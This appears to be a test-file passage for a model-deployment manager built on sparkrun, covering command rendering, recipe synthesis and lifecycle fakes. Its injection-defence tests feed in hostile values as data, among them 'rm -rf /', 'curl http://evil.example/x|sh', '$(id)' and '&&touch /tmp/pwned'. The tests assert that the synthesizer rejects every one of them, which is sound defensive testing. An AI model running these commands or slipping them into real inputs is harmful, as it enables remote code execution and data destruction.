"""Agent F: deployment manager, sparkrun adapter, lifecycle, Docker.

Organised against the acceptance list in agents/F-deploy.md. Tests that shell
out to a real sparkrun or a real docker are marked and skip when those are
absent; everything else runs anywhere.
"""

from __future__ import annotations

import pathlib

import dataclasses

import asyncio
import json
import os
import shutil
import subprocess
import sys
import json
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from control_plane.contracts import (  # noqa: E402
    Deployment,
    DeploymentPort,
    DeploymentState as S,
    Modality,
    NodeState,
    ParallelismKind,
    ParallelismPlan,
)
from control_plane.deploy import (  # noqa: E402
    DeploymentManager,
    DeploymentStore,
    DuplicateDeployment,
    EventBus,
    IllegalTransition,
    LaunchError,
    LaunchRefused,
    SparkrunAdapter,
    SparkrunNotInstalled,
    StubDeploymentManager,
    backend_origin,
)
from control_plane.deploy import events as ev  # noqa: E402
from control_plane.deploy import health  # noqa: E402
from control_plane.deploy import recipes  # noqa: E402
from control_plane.deploy.flags import KNOBS_BY_NAME, RUNTIMES  # noqa: E402
from control_plane.deploy.fsm import LEGAL, SERVING, TERMINAL  # noqa: E402
from control_plane.deploy.recipes import materialize, synthesize  # noqa: E402
from control_plane.deploy.sparkrun import default_served_name, is_oom  # noqa: E402
from tests import fixtures as fx  # noqa: E402

REPO = Path(__file__).resolve().parents[1]
HAVE_SPARKRUN = shutil.which("sparkrun") is not None
HAVE_DOCKER = shutil.which("docker") is not None

needs_sparkrun = pytest.mark.skipif(not HAVE_SPARKRUN, reason="sparkrun not installed")
needs_docker = pytest.mark.skipif(not HAVE_DOCKER, reason="docker not installed")


# --------------------------------------------------------------------------
# Fakes. Small enough to read; the point is that no test needs a real cluster.
# --------------------------------------------------------------------------


class FakeRegistry:
    """RegistryPort over a mutable dict of NodeState."""

    def __init__(self, *profiles):
        self._nodes = {p.node_id: fx.node_state(p) for p in profiles}

    def list_nodes(self) -> list[NodeState]:
        return list(self._nodes.values())

    def get_node(self, node_id: str) -> NodeState | None:
        return self._nodes.get(node_id)

    def healthy_nodes(self) -> list[NodeState]:
        return [n for n in self._nodes.values() if n.healthy]

    def set_memory_pct(self, node_id: str, pct: float) -> None:
        """*pct* of `addressable_memory` -- M-13: that is the denominator the
        manager's pressure watch now shares with the gateway's admission
        controller, not the nameplate `total_memory` (they disagree on GB10:
        addressable 119.7 GiB < total 128 GiB). Setting against total here
        would silently test a different fraction than the manager computes.
        """
        node = self._nodes[node_id]
        node.memory_used = int(node.profile.addressable_memory * pct / 100.0)

    def set_healthy(self, node_id: str, healthy: bool) -> None:
        self._nodes[node_id].healthy = healthy


class FakeAdapter(SparkrunAdapter):
    """SparkrunAdapter with the subprocess calls replaced.

    Subclassed rather than mocked so render_command, recipe synthesis and host
    resolution are the real code under test; only the four methods that shell
    out are swapped.
    """

    def __init__(self, *args, **kwargs):
        self.fail_with: LaunchError | None = kwargs.pop("fail_with", None)
        super().__init__(*args, **kwargs)
        self.running: set[str] = set()
        self.launches: list[list[str]] = []
        self.stops: list[str] = []
        self.log_tail = ""
        #: Every log follower this adapter has handed out, so a test can ask
        #: whether the manager closed them. One left running holds a `docker
        #: exec` open on the node.
        self.streams: list["_FakeLogStream"] = []
        self.launch_output: list[str] = [
            "Ensuring container image is available locally...",
            "Ensuring model %s is available locally..." % "the-model",
        ]
        self.stop_confirms = True
        #: Seconds `launch` spends before it returns, so a test can spend part
        #: of the launch budget inside the launcher the way a real image pull
        #: and weight download do.
        self.launch_delay = 0.0
        self._counter = 0
        # M-16: cluster ids whose check-job a wedged host cannot answer.
        # is_running() must read this as unknown (None), not as False.
        self.unknown: set[str] = set()

    def available(self) -> bool:
        return True

    def launch(
        self, plan, shape, runtime, ctx, max_seqs, *, served_name=None, port=None,
        gpu_memory_utilization=None, on_output=None, extra_args=(), custom_command=(),
    ):
        if self.fail_with is not None:
            raise self.fail_with
        if self.launch_delay:
            time.sleep(self.launch_delay)
        # The real adapter streams sparkrun's output line by line while the
        # image and the weights arrive. A fake that swallowed it would let the
        # manager's progress reporting pass a test it does not exercise, so
        # this says the two things sparkrun says on the way through.
        for line in self.launch_output:
            if on_output is not None:
                on_output(line)
        self._counter += 1
        cluster_id = "sparkrun_%012x" % self._counter
        # Rendered exactly as the real adapter renders it, including the
        # per-launch share: a fake that dropped it would let the manager pass
        # a utilization nothing ever checks.
        recipe = self.recipe_for(
            plan, shape, runtime, ctx, max_seqs, served_name=served_name, port=port,
            gpu_memory_utilization=gpu_memory_utilization, extra_args=extra_args,
            custom_command=custom_command,
        )
        materialize(recipe)
        argv = self.render_command(
            plan, shape, runtime, ctx, max_seqs, served_name=served_name, port=port,
            recipe=recipe, gpu_memory_utilization=gpu_memory_utilization,
        )
        self.launches.append(argv)
        self.running.add(cluster_id)
        hosts = self.hosts_for(plan.node_ids)
        chosen = port if port is not None else self.base_port
        from control_plane.deploy.sparkrun import LaunchResult

        return LaunchResult(
            cluster_id=cluster_id,
            head_host=hosts[0],
            backend_url="http://%s:%d/v1" % (hosts[0], chosen),
            port=chosen,
            hosts=hosts,
            recipe_path=Path(self.recipe_dir) / "fake.yaml",
            argv=argv,
            raw="Cluster:   %s\n" % cluster_id,
        )

    def check_job(self, cluster_id, *, hosts=None, timeout=60.0):
        if cluster_id in self.unknown:
            return {"running": None, "cluster_id": cluster_id, "error": "check-job timed out"}
        return {"running": cluster_id in self.running, "cluster_id": cluster_id}

    def stop(self, cluster_id, *, hosts=None):
        self.stops.append(cluster_id)
        if self.stop_confirms:
            self.running.discard(cluster_id)
            return True, "stopped"
        return False, "stop failed"

    def logs(self, cluster_id, *, hosts=None, tail=200, timeout=30.0):
        return self.log_tail

    def stream_logs(self, cluster_id, *, hosts=None, tail=60, on_line=None):
        """A follower that delivers what `log_tail` holds, then stays open.

        The real one is a `tail -f` inside the container: it keeps running,
        which is why the manager closes it rather than waiting for it. A fake
        that reported itself dead would send the manager round its retry loop
        for no reason, so this one is alive until it is closed.
        """
        for line in (self.log_tail or "").splitlines():
            if on_line is not None and line.strip():
                on_line(line)
        return _FakeLogStream(self)


class _FakeLogStream:
    def __init__(self, adapter: "FakeAdapter") -> None:
        self.adapter = adapter
        self.closed = False
        adapter.streams.append(self)

    @property
    def alive(self) -> bool:
        return not self.closed

    def close(self) -> None:
        self.closed = True


class FakeProbe:
    """Health probe whose answer is a dict the test controls."""

    def __init__(self, healthy_by_default: bool = True):
        self.healthy_by_default = healthy_by_default
        self.overrides: dict[str, bool] = {}
        self.calls = 0

    def __call__(self, backend_url: str, timeout: float = 3.0, expect_model=None):
        self.calls += 1
        healthy = self.overrides.get(backend_url, self.healthy_by_default)
        return (True, None) if healthy else (False, "%s unreachable" % backend_url)

    def kill(self, backend_url: str) -> None:
        self.overrides[backend_url] = False


def make_manager(tmp_path, *, registry=None, probe=None, **kwargs) -> DeploymentManager:
    registry = registry or FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    # Every port free unless a test says otherwise. The real check binds, so
    # left in it would make port assertions depend on what else happens to be
    # listening on the machine running the suite -- which on the live box is a
    # coordinator on 8088 and whatever is holding 8100.
    kwargs.setdefault("port_free_fn", lambda port: True)
    # setdefault, not fixed: a test about what happens when readiness runs out
    # has to be able to shorten the wait rather than spend the default on it.
    kwargs.setdefault("ready_poll_interval_s", 0.01)
    kwargs.setdefault("ready_timeout_s", 5.0)
    kwargs.setdefault("stop_confirm_timeout_s", 1.0)
    return DeploymentManager(
        adapter,
        registry,
        state_dir=tmp_path,
        probe_fn=probe or FakeProbe(),
        autostart=False,
        **kwargs,
    )


def wait_for(predicate, timeout: float = 5.0, interval: float = 0.01) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if predicate():
            return True
        time.sleep(interval)
    return predicate()


def drain(bus: EventBus, event_type: str) -> list[dict]:
    return [e for e in bus.recent() if e["type"] == event_type]


# ==========================================================================
# Acceptance: a WONT_FIT verdict never produces a launch attempt, and the
# returned error is Agent D's reason verbatim.
# ==========================================================================


def test_wont_fit_never_launches_and_the_reason_is_verbatim(tmp_path):
    manager = make_manager(tmp_path)
    fit = fx.wont_fit()

    with pytest.raises(LaunchRefused) as excinfo:
        manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fit, "vllm", 65536, 256)

    assert str(excinfo.value) == fit.reason
    assert excinfo.value.reason == fit.reason
    assert excinfo.value.fit is fit
    assert manager.adapter.launches == []
    assert manager.list() == []
    # Not even a recipe file was written.
    assert not (tmp_path / "recipes").exists()

    refusals = drain(manager.bus, ev.LAUNCH_REFUSED)
    assert len(refusals) == 1
    assert refusals[0]["reason"] == fit.reason


def test_wont_fit_reason_is_not_paraphrased_by_the_stub_either():
    stub = StubDeploymentManager()
    fit = fx.wont_fit()
    with pytest.raises(LaunchRefused) as excinfo:
        stub.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fit, "vllm", 65536, 256)
    assert str(excinfo.value) == fit.reason
    assert stub.list() == []
    stub.close()


def test_fits_degraded_still_launches(tmp_path):
    """FITS_DEGRADED means slow, not refused. Only WONT_FIT blocks."""
    manager = make_manager(tmp_path)
    deployment = manager.launch(
        fx.LLAMA_3_3_70B, fx.pp2_plan(), fx.fits_degraded(), "vllm", 8192, 16
    )
    assert deployment.state is S.LAUNCHING
    manager.close()


# ==========================================================================
# Acceptance: render_command produces the correct sparkrun invocation for
# pipeline parallel across two hosts, verified against real sparkrun flags.
# ==========================================================================


def test_render_command_pipeline_parallel_across_two_hosts(tmp_path):
    adapter = FakeAdapter(
        FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "recipes"
    )
    argv = adapter.render_command(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)

    assert argv[0] == "sparkrun"
    assert argv[1] == "run"
    assert argv[2].endswith(".yaml")

    def value_after(flag: str) -> str:
        return argv[argv.index(flag) + 1]

    # node_ids resolved to the addresses sparkrun connects to, head first.
    assert value_after("--hosts") == "%s,%s" % (fx.SPARK_01.address, fx.SPARK_02.address)
    assert value_after("--tp") == "1"
    assert value_after("--pp") == "2"
    assert value_after("--max-model-len") == "65536"
    assert value_after("--served-model-name") == "gpt-oss-120b"
    assert value_after("--port") == "8100"
    assert value_after("--gpu-mem") == "0.90"
    # There is no --max-num-seqs flag in sparkrun; concurrency rides -o.
    assert "-o" in argv and "max_num_seqs=512" in argv
    assert "--max-num-seqs" not in argv
    # Detached, so the launcher returns instead of streaming logs forever.
    assert argv[-1] == "--no-follow"


def test_render_command_is_pure(tmp_path):
    """No subprocess, no filesystem, same answer every time."""
    adapter = FakeAdapter(
        FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "recipes"
    )
    first = adapter.render_command(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)
    second = adapter.render_command(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)
    assert first == second
    assert not (tmp_path / "recipes").exists()
    assert adapter.launches == []


def test_render_command_sglang_uses_its_own_concurrency_key(tmp_path):
    adapter = FakeAdapter(FakeRegistry(fx.SPARK_01), recipe_dir=tmp_path / "recipes")
    argv = adapter.render_command(fx.single_node_plan(), fx.QWEN3_30B_A3B, "sglang", 32768, 128)
    assert "max_running_requests=128" in argv
    assert "max_num_seqs=128" not in argv


def test_render_command_omits_default_parallelism_overrides(tmp_path):
    """EP=1 and DP=1 are not sent: sparkrun hashes non-default parallelism
    into the cluster_id, so sending an explicit 1 would change the handle."""
    adapter = FakeAdapter(FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "r")
    argv = adapter.render_command(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)
    assert not any(a.startswith("expert_parallel=") for a in argv)
    assert not any(a.startswith("data_parallel=") for a in argv)


def test_render_command_sends_expert_parallel_when_planned(tmp_path):
    plan = ParallelismPlan(
        kind=ParallelismKind.EXPERT,
        tensor_parallel=1,
        pipeline_parallel=1,
        expert_parallel=2,
        data_parallel=1,
        node_ids=["spark-01", "spark-02"],
        reason="Expert parallel across 2 nodes.",
        measured_link_gbps=48.0,
        rejected=[],
    )
    adapter = FakeAdapter(FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "r")
    argv = adapter.render_command(plan, fx.GPT_OSS_120B, "vllm", 32768, 256)
    assert "expert_parallel=2" in argv
    recipe = adapter.recipe_for(plan, fx.GPT_OSS_120B, "vllm", 32768, 256)
    assert "--enable-expert-parallel" in recipe.content


def test_unknown_node_id_falls_back_to_the_id_itself(tmp_path):
    """Node ids are hostnames in practice. An unknown one is used verbatim
    rather than blocking a launch on a registry that has not caught up."""
    adapter = FakeAdapter(FakeRegistry(fx.SPARK_01), recipe_dir=tmp_path / "r")
    assert adapter.hosts_for(["spark-01", "spark-99"]) == [fx.SPARK_01.address, "spark-99"]


def test_flag_table_is_the_only_place_flags_are_spelled():
    """Guard against flags creeping back into the code as string literals."""
    source = (REPO / "control_plane" / "deploy" / "sparkrun.py").read_text()
    for knob in KNOBS_BY_NAME.values():
        if knob.cli_flag:
            assert knob.cli_flag not in source, (
                "%s is hardcoded in sparkrun.py; it belongs in flags.py" % knob.cli_flag
            )


# ==========================================================================
# The synthesized recipe. The reason it exists: a stock recipe silently drops
# overrides its command template does not mention.
# ==========================================================================


def test_synthesized_recipe_templates_every_knob_we_override(tmp_path):
    recipe = synthesize(
        fx.GPT_OSS_120B,
        fx.pp2_plan(),
        "vllm",
        65536,
        512,
        "gpt-oss-120b",
        port=8100,
        gpu_memory_utilization=0.90,
        recipe_dir=tmp_path,
    )
    body = recipe.content
    # Every CLI flag we send writes one of these recipe keys. If the command
    # template does not reference the key, sparkrun accepts the flag, exits
    # zero, and the value never reaches the runtime.
    for key in (
        "tensor_parallel",
        "pipeline_parallel",
        "max_model_len",
        "max_num_seqs",
        "port",
        "served_model_name",
        "gpu_memory_utilization",
    ):
        assert "{%s}" % key in body, "recipe command drops %s" % key
        assert "\n  %s:" % key in body, "recipe defaults omit %s" % key
    assert "model: openai/gpt-oss-120b" in body
    assert "runtime: vllm" in body
    assert "min_nodes: 2" in body


def test_the_tts_recipe_runs_derates_own_server_and_templates_every_knob(tmp_path):
    """The third runtime, and the only command template that is ours.

    Two separate claims, and the second is the one that bites. `runtime: vllm`
    in a tts recipe is deliberate -- sparkrun's runtime field selects its
    orchestration plugin, and every plugin renders an explicit `command:`
    verbatim, so this borrows the one whose solo path is "run this container
    with this command" and brings its own command. And because
    `render_command` emits every knob for every runtime, a key the template
    does not mention is accepted by sparkrun, exits zero, and never reaches
    the server.
    """
    recipe = synthesize(
        fx.AUDIO8_TTS_0_6B,
        fx.single_node_plan(),
        "tts",
        2048,
        1,
        "audio8-tts",
        port=8100,
        gpu_memory_utilization=0.90,
        recipe_dir=tmp_path,
    )
    body = recipe.content
    assert "python3 -m control_plane.runtimes.tts" in body
    assert "vllm serve" not in body and "sglang" not in body
    for key in (
        "tensor_parallel",
        "pipeline_parallel",
        "max_model_len",
        "max_num_seqs",
        "port",
        "served_model_name",
        "gpu_memory_utilization",
    ):
        assert "{%s}" % key in body, "recipe command drops %s" % key
        assert "\n  %s:" % key in body, "recipe defaults omit %s" % key
    # The remote code is the model: these checkpoints ship their own
    # architecture, and without this flag transformers refuses to load them.
    assert "--trust-remote-code" in body
    assert "runtime: vllm" in body
    assert "min_nodes: 1" in body


def test_the_vllm_image_is_the_one_that_can_read_an_audio_file():
    """Not the upstream image, and reverting this to it breaks transcription
    in a way no gate in this project can see.

    `ghcr.io/spark-arena/dgx-vllm-eugr-nightly` carries no audio decoder at
    all -- no torchcodec, no soundfile, no PyAV, no system ffmpeg. vLLM serves
    /v1/audio/transcriptions from it regardless: a Whisper deployment reaches
    READY, answers the health identity check, is indexed as a transcription
    target and refuses every upload with "Invalid or unsupported audio file."
    The resolver said the architecture was supported, the fit gate said it
    fit, and both were right. docker/audio.Dockerfile is that image plus the
    two packages, and its build asserts the 44.1 kHz -> 16 kHz resample the
    upstream one cannot do.
    """
    spec = RUNTIMES["vllm"]
    assert spec.default_image == "ghcr.io/pizzaman213/derate/vllm-audio:latest"
    assert spec.default_image_env == "DERATE_VLLM_IMAGE"
    # Still one knob, and it still points anywhere: the operator who wants
    # exactly the upstream image can have it.
    upstream = "ghcr.io/spark-arena/dgx-vllm-eugr-nightly:latest"
    assert recipes.container_image(spec, {"DERATE_VLLM_IMAGE": upstream}) == upstream
    assert recipes.container_image(spec, {}) == spec.default_image


def test_the_audio_dockerfile_builds_on_the_image_it_is_a_layer_over():
    """Two files name the base and they have to agree, or the audio image is
    a pip layer over a vLLM nobody is running."""
    body = (REPO / "docker" / "audio.Dockerfile").read_text()
    assert "ARG BASE=ghcr.io/spark-arena/dgx-vllm-eugr-nightly:latest" in body
    # Both packages, because soundfile alone is not enough: it opens the file
    # and then hands every rate conversion to PyAV, so without PyAV a 16 kHz
    # clip decodes and a 44.1 kHz one -- which is what this project's own tts
    # runtime writes -- raises ImportError.
    assert '"${AV}"' in body and '"${SOUNDFILE}"' in body
    # The build proves the resample rather than proving the import.
    assert "load_audio" in body and "44100" in body


def test_a_runtime_that_cannot_shard_refuses_the_degrees_before_the_launch():
    """A single-process runtime handed TP=2 passes the fit gate -- per-rank
    arithmetic makes a sharded model fit MORE easily -- commits two machines,
    starts one server, and sits in LAUNCHING until the health timeout. The
    refusal has to come from the runtime table, which is the only thing that
    knows."""
    from control_plane.deploy.flags import sharding_refusal

    assert sharding_refusal("tts", 1, 1) is None
    for degrees in ((2, 1, 1, 1), (1, 2, 1, 1), (1, 1, 2, 1), (1, 1, 1, 2)):
        reason = sharding_refusal("tts", *degrees)
        assert reason and "cannot shard" in reason
    # And it is a property of the runtime, not of the number: vllm shards.
    assert sharding_refusal("vllm", 4, 2, 2, 2) is None
    assert sharding_refusal("sglang", 2, 2) is None


def test_synthesized_recipe_is_deterministic(tmp_path):
    args = (fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b")
    kwargs = dict(port=8100, gpu_memory_utilization=0.90, recipe_dir=tmp_path)
    a = synthesize(*args, **kwargs)
    b = synthesize(*args, **kwargs)
    assert a.path == b.path and a.content == b.content
    c = synthesize(*args, **{**kwargs, "port": 8101})
    assert c.path != a.path


def test_materialize_is_atomic_and_idempotent(tmp_path):
    recipe = synthesize(
        fx.QWEN3_30B_A3B, fx.single_node_plan(), "sglang", 32768, 128, "qwen3",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path / "recipes",
    )
    first = materialize(recipe)
    second = materialize(recipe)
    assert first == second
    assert first.read_text() == recipe.content
    assert list(first.parent.glob("*.tmp")) == []


# ==========================================================================
# Acceptance: recipe content is not a place an attacker-controlled string
# gets to write YAML structure. M-22.
# ==========================================================================


def test_a_newline_in_model_id_is_rejected_not_injected(tmp_path):
    """A newline-bearing model_id must not reach the recipe file at all --
    it could otherwise open a new top-level key, including command:, in a
    file sparkrun executes."""
    import dataclasses

    hostile = dataclasses.replace(
        fx.GPT_OSS_120B,
        model_id="openai/gpt-oss-120b\ncommand: |\n  rm -rf /",
    )
    with pytest.raises(ValueError, match="model_id"):
        synthesize(
            hostile, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        )
    # synthesize is pure -- it never got the chance to hand a RecipeSpec to
    # materialize, so nothing was ever written for this launch to run.
    assert list(tmp_path.glob("*.yaml")) == []


def test_a_newline_in_served_name_is_rejected_not_injected(tmp_path):
    with pytest.raises(ValueError, match="served_name"):
        synthesize(
            fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512,
            "gpt-oss-120b\ncommand: |\n  curl evil.example | sh",
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        )
    assert list(tmp_path.glob("*.yaml")) == []


def test_shell_metacharacters_are_rejected_even_though_the_yaml_is_valid(tmp_path):
    """The other half of M-22. sparkrun injects the recipe's model: into the
    substitution namespace (core/recipe.py, base.setdefault("model", ...)),
    substitutes it into {model}, and the executor runs the rendered command
    under bash -c in a container its own defaults make privileged with host
    networking. This payload carries no newline, no control character, and a
    harmless leading letter -- so every YAML check passes and it would have
    executed."""
    import dataclasses

    hostile = dataclasses.replace(
        fx.GPT_OSS_120B,
        model_id="openai/gpt-oss-120b;curl http://evil.example/x|sh",
    )
    with pytest.raises(ValueError, match="model_id"):
        synthesize(
            hostile, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        )
    assert list(tmp_path.glob("*.yaml")) == []


@pytest.mark.parametrize(
    "field,value",
    [
        ("model_id", "org/name;id"),
        ("model_id", "org/name$(id)"),
        ("model_id", "org/name`id`"),
        ("model_id", "org/name&&touch /tmp/pwned"),
        ("model_id", "org/name|sh"),
        ("model_id", "org/name {model}"),  # would re-expand: substitution is a fixpoint loop
        ("served_name", "name;curl evil.example|sh"),
        ("served_name", "name with spaces"),
    ],
)
def test_command_unsafe_strings_are_rejected(tmp_path, field, value):
    import dataclasses

    shape = fx.GPT_OSS_120B
    served = "gpt-oss-120b"
    if field == "model_id":
        shape = dataclasses.replace(shape, model_id=value)
    else:
        served = value
    with pytest.raises(ValueError, match=field):
        synthesize(
            shape, fx.pp2_plan(), "vllm", 65536, 512, served,
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        )
    assert list(tmp_path.glob("*.yaml")) == []


@pytest.mark.parametrize(
    "model_id",
    [
        "openai/gpt-oss-120b",
        "meta-llama/Llama-3.3-70B-Instruct",
        "deepseek-ai/DeepSeek-V3",
        "org.name/model_v1.0-instruct",
        "TheBloke/Llama-2-7B-Chat-GGUF:Q4_K_M",  # quant tag colon
        "Qwen/Qwen3-30B-A3B",
    ],
)
def test_real_model_ids_still_synthesize(tmp_path, model_id):
    """The command grammar is an allowlist, so it has to be checked against
    real ids or it silently becomes a denial of service on valid input."""
    import dataclasses

    shape = dataclasses.replace(fx.GPT_OSS_120B, model_id=model_id)
    recipe = synthesize(
        shape, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
    )
    assert "model: %s\n" % model_id in recipe.content


@pytest.mark.parametrize(
    "field,value",
    [
        ("model_id", "org/name\r\ncommand: evil"),  # bare CR
        ("model_id", "org/name\x00hidden"),  # NUL, a control character
        ("model_id", "- looks-like-a-sequence-item"),  # leading dangerous token
        ("model_id", "#not-a-comment-but-could-be-read-as-one"),
        ("model_id", ""),  # empty
        ("served_name", "\tindented-with-a-control-char"),
    ],
)
def test_yaml_unsafe_strings_are_rejected(tmp_path, field, value):
    import dataclasses

    shape = fx.GPT_OSS_120B
    served_name = "gpt-oss-120b"
    if field == "model_id":
        shape = dataclasses.replace(shape, model_id=value)
    else:
        served_name = value
    with pytest.raises(ValueError):
        synthesize(
            shape, fx.pp2_plan(), "vllm", 65536, 512, served_name,
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        )


@pytest.mark.parametrize(
    "model_id",
    [
        "meta-llama/Llama-3.3-70B-Instruct",
        "openai/gpt-oss-120b",
        "deepseek-ai/DeepSeek-V3",
        "TheBloke/Llama-2-7B-Chat-GGUF:Q4_K_M",  # quant-tag colon
        "org.name/model_v1.0-instruct",  # dots and underscores
    ],
)
def test_legitimate_hf_ids_are_not_rejected(tmp_path, model_id):
    """Slashes, dots, dashes, underscores, and a non-leading colon are all
    real HuggingFace-id syntax and must keep working."""
    import dataclasses

    shape = dataclasses.replace(fx.GPT_OSS_120B, model_id=model_id)
    recipe = synthesize(
        shape, fx.pp2_plan(), "vllm", 65536, 512, "served-name",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
    )
    assert "model: %s\n" % model_id in recipe.content


@pytest.mark.parametrize(
    "model_id",
    [
        "/data/models/Llama-3.3-70B-Instruct",  # local dir, resolver.py:177
        "~/models/llama",  # home-relative, as resolver.py:75 would expand it
        "/data/models/local.gguf",  # local .gguf file, resolver.py:82-90
        "./relative/model-dir",  # a relative local dir is legal Path syntax too
    ],
)
def test_local_path_model_ids_still_synthesize(tmp_path, model_id):
    """M-22 regression: resolver.py resolves a local directory or a local
    .gguf file by handing its path straight through as ModelShape.model_id
    (see resolver.py's docstring: "a model id, a local directory, or a local
    .gguf file"), including an absolute path. An earlier version of the
    command-safety allowlist anchored the first character to alnum, which
    rejected every one of these -- a real, previously-supported capability,
    not a hypothetical one (test_resolver.py exercises the local-.gguf path
    with an absolute tmp_path). None of these characters are outside what
    the grammar already allowed elsewhere in the string; only the leading
    position was too strict.
    """
    import dataclasses

    shape = dataclasses.replace(fx.GPT_OSS_120B, model_id=model_id)
    recipe = synthesize(
        shape, fx.pp2_plan(), "vllm", 65536, 512, "served-name",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
    )
    assert "model: %s\n" % model_id in recipe.content


@pytest.mark.parametrize(
    "model_id",
    [
        "/data/models/x;curl http://evil.example|sh",
        "/data/models/x$(id)",
        "/data/models/x && touch /tmp/pwned",
        "~/models/x`id`",
    ],
)
def test_path_shaped_command_unsafe_strings_are_still_rejected(tmp_path, model_id):
    """The other direction of the M-22 local-path fix: widening the leading
    character class to admit '/', '.', and '~' must not smuggle a shell
    metacharacter in behind a harmless-looking path prefix. Every one of
    these starts with a character the grammar now allows to lead, and would
    still reach the command template as {model} if not rejected."""
    import dataclasses

    shape = dataclasses.replace(fx.GPT_OSS_120B, model_id=model_id)
    with pytest.raises(ValueError, match="model_id"):
        synthesize(
            shape, fx.pp2_plan(), "vllm", 65536, 512, "served-name",
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        )
    assert list(tmp_path.glob("*.yaml")) == []


@pytest.mark.parametrize(
    "extra_args",
    [
        ("--quantization", "modelopt_fp4"),
        ("--kv-cache-dtype=fp8",),
        ("-tp", "2"),
        ("--trust-remote-code",),
        ("--lora-modules", "/cache/huggingface/derate-runtime-cache/lora"),
    ],
)
def test_safe_extra_args_reach_the_generated_command(tmp_path, extra_args):
    """A caller's own runtime flags, once past check_extra_args_safe, land in
    the recipe's command block -- the whole point of the escape hatch."""
    recipe = synthesize(
        fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        extra_args=extra_args,
    )
    assert " ".join(extra_args) in recipe.content
    # And recorded in the metadata block, so a recipe that deviates from the
    # standard template is legible on its own without a diff.
    assert "derate_extra_args" in recipe.content


def test_no_extra_args_means_no_metadata_line_and_no_change_to_the_command(tmp_path):
    baseline = synthesize(
        fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
    )
    assert "derate_extra_args" not in baseline.content


@pytest.mark.parametrize(
    "token",
    [
        "--foo;curl http://evil.example|sh",
        "--foo$(id)",
        "--foo`id`",
        "--foo&&touch /tmp/pwned",
        "--foo|sh",
        "with a space",
        "",
        "-",
        "--",
    ],
)
def test_unsafe_extra_args_are_rejected(tmp_path, token):
    """The third M-22 surface: extra_args land in the same command: | block
    as model_id and served_name, one per continuation line, and are just as
    reachable by a shell metacharacter."""
    with pytest.raises(ValueError, match="extra_args"):
        synthesize(
            fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
            extra_args=(token,),
        )
    assert list(tmp_path.glob("*.yaml")) == []


# ==========================================================================
# custom_command: replaces the generated command instead of appending to it.
# ==========================================================================


def test_custom_command_replaces_the_plan_derived_flags(tmp_path):
    """The operator's own tokens land in the command, and none of the
    planner's numeric flags -- TP, PP, context, concurrency,
    gpu_memory_utilization -- reach it at all."""
    custom_command = ("--tensor-parallel-size", "1", "--gpu-memory-utilization", "0.5")
    recipe = synthesize(
        fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        custom_command=custom_command,
    )
    assert " ".join(custom_command) in recipe.content
    assert "derate_custom_command" in recipe.content
    assert "derate_extra_args" not in recipe.content
    # None of _serve_command's own plan-derived placeholders survive: the
    # operator's own --tensor-parallel-size above is the only one in the
    # command, not the generated {max_model_len}/{max_num_seqs} pair.
    assert "{max_model_len}" not in recipe.content
    assert "{max_num_seqs}" not in recipe.content
    assert "--trust-remote-code" not in recipe.content


def test_custom_command_still_names_the_resolved_model(tmp_path):
    """{model} is still the fit gate's own id -- there is no way for operator
    text to reach it, since the M-22 grammar admits neither `{` nor `}`."""
    recipe = synthesize(
        fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        custom_command=("--quantization", "modelopt_fp4"),
    )
    assert recipe.content.count("{model}") == 1
    assert "vllm serve" in recipe.content


def test_custom_command_pins_host_port_served_name_after_operator_text(tmp_path):
    """The gateway's routing triple is appended LAST, so it wins over
    whatever the operator's own text put before it -- every runtime here
    parses repeated flags last-occurrence-wins, the same way argparse does."""
    recipe = synthesize(
        fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        custom_command=("--served-model-name", "whatever-i-want"),
    )
    command_block = recipe.content.split("command: |\n", 1)[1]
